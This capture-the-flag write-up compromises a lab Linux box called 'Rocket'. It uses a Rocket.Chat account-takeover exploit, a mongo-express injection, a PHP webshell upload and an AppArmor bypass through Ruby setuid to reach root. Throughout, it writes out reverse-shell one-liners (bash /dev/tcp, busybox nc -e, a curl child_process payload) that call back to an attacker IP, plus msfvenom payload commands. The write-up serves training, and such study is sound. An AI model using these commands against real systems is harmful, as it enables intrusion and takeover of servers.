# Rocket

### Typology:

_Linux_

---

We begin by enumerating the target ports:
```bash
nmap -sC -sV -p- 10.10.18.7

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b5:20:37:9f:99:b2:4f:23:ba:3a:43:60:b7:45:c8:62 (RSA)
|   256 12:77:83:03:1f:64:bb:40:5d:bf:2c:48:e2:5a:b5:18 (ECDSA)
|_  256 74:7c:e6:07:78:fc:fd:45:1d:e8:2b:d5:02:66:8e:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://rocket.thm
Service Info: Host: rocket.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Summarize:

- _port 22 SSH_

- _port 80 HTTP called rocket.thm (we added to __"/etc/hosts"__)_

We visit the website, the only valuable things are in the __"/people"__ (we retrieve some information like name, surnames and emails) and __"wappalyzer's"__ output.

![wapp](./pics/wapp.png)

The website uses __"Bolt"__ CMS, a quick googling reveals that the __"/bolt"__ is the login page but we haven't any credentials.

it's time to use feroxbuster and wfuzz
```bash
feroxbuster -u http://rocket.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,7z,docx,old,sh,aspx,json,yaml

200      GET      364l      741w     6647c http://rocket.thm/theme/base-2021/css/base-2021.css
200      GET      195l     1142w   118495c http://rocket.thm/thumbs/400%C3%97300%C3%97crop/products/2021/06/corporate-events.jpg
301      GET       12l       22w      346c http://rocket.thm/product/ => http://rocket.thm/product
301      GET        9l       28w      302c http://rocket.thm/index.php => http://rocket.thm/
301      GET       12l       22w      334c http://rocket.thm/page/ => http://rocket.thm/page
200      GET      110l      266w     2931c http://rocket.thm/theme/base-2021/js/app.js
200      GET      147l      847w    87398c http://rocket.thm/thumbs/400%C3%97300%C3%97crop/products/2021/06/community-event.jpeg
200      GET      304l     1191w    17495c http://rocket.thm/products
200      GET      391l     1114w    18365c http://rocket.thm/person/lucy-crooks
200      GET      217l     1045w   106282c http://rocket.thm/thumbs/400%C3%97300%C3%97crop/products/2021/06/festive-events.jpeg
200      GET      246l      934w    14930c http://rocket.thm/search
200      GET      330l     1242w    18246c http://rocket.thm/people
301      GET       12l       22w      342c http://rocket.thm/person/ => http://rocket.thm/person
200      GET        0l        0w        0c http://rocket.thm/product/corporate-events
200      GET        0l        0w  2419899c http://rocket.thm/theme/base-2021/css/tailwind.css
301      GET       12l       22w      330c http://rocket.thm/en => http://rocket.thm/en/
301      GET        9l       28w      308c http://rocket.thm/files => http://rocket.thm/files/
```
feroxbuster doesn't find something interesting.
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://rocket.thm/ -H "Host:FUZZ.rocket.thm" --hl 9

000000070:   503        11 L     42 W       380 Ch      "chat"
```
Wfuzz found a new subdomain, we add it to __"/etc/hosts"__ and we browse it:

![login](./pics/login-1.png)

We don't have any credentials so register a new account and login once inside the only fascinating thing is other users:

![users](./pics/users.png)

After some times on google an interesting [link](https://github.com/optionalCTF/Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911) came up, a POC that it resets the admin password, retrieve the reset token and it will retur a revshell:

we open a listener:
```bash
nc -lnvp 6666
```
command to execute the exploit.py:
```bash
python3 exploit.py -u <email created> -a admin@rocket.thm -H http://chat.rocket.thm -p '<password for the previous account created>' --ip <local ip> --port <local port>



# We write admin@rocket.thm for two reasons: the first one because the admin user is present, the second one because in the previous email the pattern was <name>@rocket.thm

[+] Password Reset Email Sent
[+] Pulling Password Reset Token
[+] Reset Token: 9yGlQzyIScOUEewTCuG4e8Vq_r60bEJImg6vGzrhp0a
[+] Password was changed to 123456789
[+] Sending Reverse Shell Integration
[+] Shell for 10.8.98.143:6666 Has Executed!
```
It works, admin's password has changed before to use the revshell we login on website to see if there is something and indeed:
```
Admin 4:33 PM
Hey Laurent, I've recently upgraded the authentication mechanism for this portal and made a full database backup just in case we need to revert. If any of the team's passwords are not working can you please tell them to notify me and I will set a new password for them. Cheers!
```
It seems there is a db-backup, keep in mind for later.

We have a revshell but I prefer to switch on pwncat with the following command:
```bash
python3 -m pwncat -lp 5555 #listener

/bin/bash -i >& /dev/tcp/10.8.98.143/5555 0>&1 #revshell
```
We proceed with some manual enumeration and recognition. After some times the most valuable information are:

- /app/bundle/README:
```bash
$ export MONGO_URL='mongodb://user:password@host:port/databasename'
```
- Env command:
```bash
MONGO_WEB_INTERFACE=172.17.0.4:8081
```
- Previous email talks about a db backup

It's time to forward some port, we can use chisel or other tool I prefer to use Meterpreter so:
```bash
msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost 10.8.98.143; set lport 7777; exploit" #listener

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.8.98.143 LPORT=7777 -f elf -o reverse.elf #command to create payload

upload rev.elf /tmp/rev.elf #pwncat command

chmod +x rev.elf
./rev.elf
```
Meterpreter command to forward it:
```bash
portfwd add -l 8081 -L 127.0.0.1 -p 8081 -r 172.17.0.4
```

We can now visit the following URL __"http://127.0.0.1:8081"__, it's a Mongo-Express login page, we don't have any credentials so we use our friend google to search something on mongo-express

This [link](https://github.com/masahiro331/CVE-2019-10758) talk about a possible revshell send via __"Curl"__:
```bash
nc -lnvp 10002 #listener

curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").exec("busybox nc 10.8.98.143 10002 -e /bin/bash")' #command

```
We have another revshell, we can look around...
The most interesting thing afters some time spend on the filesystem is the /backup folder (db backup from the previous message), we can download it by switching on pwncat:
```bash
pwncat-cs -lp 12001 #listener

/bin/bash -i >& /dev/tcp/10.8.98.143/12001 0>&1 #revshell

download /backup /tmp #pwncat command
```
then:
```bash
cd /db_backup/meteor
```
There are a lot files but one is very particulary is called __"users.bson"__ it contains some hashes we can view it with theese commands:
```bash
bsondump users.bson | jq
```
we can see some bcrypt to crack:
```bash
john hash -w=/usr/share/wordlistst/rockyout.txt
```
Terrance hash is crackable the others no.

We have new creds, I tried to use on rocket.chat but they don't works, there was the previous CMS __"Bolt"__ indeed they work

![bolt](./pics/bolt.png)

It's time to upload a webshell but first we should look around the settings, as expected we must allow .php extensions in 

![accept](./pics/accept.png)

Now we go to __"File management-> Uploaded Files-> people folder-> File Uploader and we upload this [webshell](https://github.com/flozz/p0wny-shell)-> http://rocket.thm/files/people/rev.php"__ we have a webshell, we redirect as usually to pwncat:
```bash
python3 -m pwncat -lp 12004 #listener

busybox nc 10.8.98.143 12004 -e /bin/bash #revshell to enter in webshell
```
We're in and we can submit the first flag.

There is a problem with __"sudo"__ command indeed we enter via webshell instead of to do authentication against pam, we can fix it by set up SSH access:

![ssh](./pics/ssh.png)

then:
```bash
nano id_rsa
chmod 600 id_rsa

ssh -i id_rsa alvin@10.10.95.98
```
We're in, we can upload __"linpeas.sh"__ and run it:
```bash
upload linpeas.sh /tmp/peas.sh #pwncat command
chmod +x peas.sh
./peas.sh
```
Output:

![cap](./pics/cap.png)

We have __"cap_setuid"__, we can go to [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/#capabilities), we can use the capability with the following command but it returns this error:
```bash
Traceback (most recent call last):
        1: from -e:1:in <main>
-e:1:in setuid': Operation not permitted (Errno::EPERM)'
```
There is something who block it. After some time spend to read linpeas' output I found this one:

![apparmor](./pics/armor.png)

If the apparmor is enabled? we investigate with the following commands:
```bash
ls /etc/apparmor.d/
usr.bin.ruby2.5  usr.sbin.rsyslogd  usr.sbin.tcpdump

cat usr.bin.ruby2.5

/usr/bin/ruby2.5 {
  #include <abstractions/base>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /etc/passwd r,
  /bin/cat mrix,
  /bin/cp mrix,
  /bin/ls mrix,
  /usr/bin/whoami mrix,
  /tmp/.X[0-9]*-lock rw,
  /lib/x86_64-linux-gnu/ld-*.so mr,
  /usr/bin/ruby2.5 mr,
  /usr/share/rubygems-integration/all/specifications/ r,
  /usr/share/rubygems-integration/all/specifications/did_you_mean-1.2.0.gemspec r,
  /{usr/,}lib{,32,64}/** mr,

}
```
Exactly, there are restricting rules, we can only use cat, cp and ls, whoami with ruby and also only read and write on /tmp folder with a specific regex.

We bypass it with theese commands:
```bash
cp /bin/bash ./.X6-lock #command to copy bash binary to a new file who respect the apparmor's regex
chmod +s .X6-lock #command to set SUID bit
ruby -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X6-lock /tmp/.X2-lock"' #command to create a copy of a new .X6-lock (SUID with alvin) in /tmp/.X2-lock(SUID root)

./.tmp/.X2-lock -p #command to enable new shell as root user
```
We're root and we can retrieve the las flag in the /root folder.
